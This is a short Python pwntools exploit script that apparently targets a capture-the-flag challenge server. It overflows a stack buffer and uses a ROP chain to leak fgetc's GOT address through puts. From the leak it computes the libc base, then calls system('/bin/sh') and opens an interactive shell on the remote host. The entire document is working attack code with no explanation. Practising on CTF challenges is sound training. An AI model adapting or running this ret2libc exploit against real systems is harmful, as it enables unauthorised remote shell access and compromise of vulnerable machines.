from pwn import *
context.log_level = "debug"
#io = process("./pwn")
#io = remote('127.0.0.1',10000)
io = remote('pwn.challenge.ctf.show',28291)
elf = ELF("./pwn")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
pop_rdi = 0x4008e3  # 0x00000000004008e3 : pop rdi ; ret
ret = 0x400576      
# 0x0000000000400576 : ret
fgetc_got = elf.got['fgetc']
main = elf.sym['main']
puts_plt = elf.plt['puts']
payload = 'a'*(0x110 - 0x4) + '\x18' + p64(pop_rdi) + p64(fgetc_got) + 
p64(puts_plt) + p64(main)
io.sendlineafter("T^T\n", payload)
fgetc = u64(io.recv(6).ljust(8, "\x00"))
print hex(fgetc)
libc_base = fgetc - libc.sym['fgetc']
system_addr = libc_base + libc.sym['system']
bin_sh = libc_base + libc.search("/bin/sh").next()
print "libc_base = " + hex(libc_base)
payload = 'a'*(0x110 - 0x4) + '\x18' + p64(pop_rdi) + p64(bin_sh) + p64(ret) + 
p64(system_addr)
io.sendlineafter("T^T\n", payload)
io.interactive()